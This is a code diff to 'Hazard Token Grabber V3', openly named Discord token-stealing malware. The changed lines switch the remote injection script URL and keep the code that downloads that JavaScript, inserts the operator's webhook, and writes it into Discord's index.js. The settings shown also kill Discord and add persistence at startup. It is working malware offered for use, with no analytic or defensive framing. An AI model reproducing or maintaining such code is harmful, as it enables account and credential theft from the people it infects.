@@ -23,7 +23,7 @@ config = {
     # replace WEBHOOK_HERE with your webhook ↓↓
     'webhook': "WEBHOOK_HERE",
     # keep it as it is unless you want to have a custom one
-    'injection_url': "https://raw.githubusercontent.com/Rdmo1/Hazard-Token-Grabber-V3/main/injection.js",
+    'injection_url': "https://raw.githubusercontent.com/your-bestie/Discord-Injection/master/Injection-clean.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
     'kill_processes': True,
     # if you want the file to run at startup
@@ -207,8 +207,7 @@ class Hazard_Token_Grabber_V3(functions):
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            f = httpx.get(self.fetchConf('injection_url')).text.replace(
-                                "%WEBHOOK%", self.webhook)
+                            f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
                             try:
                                 with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                     indexFile.write(f)
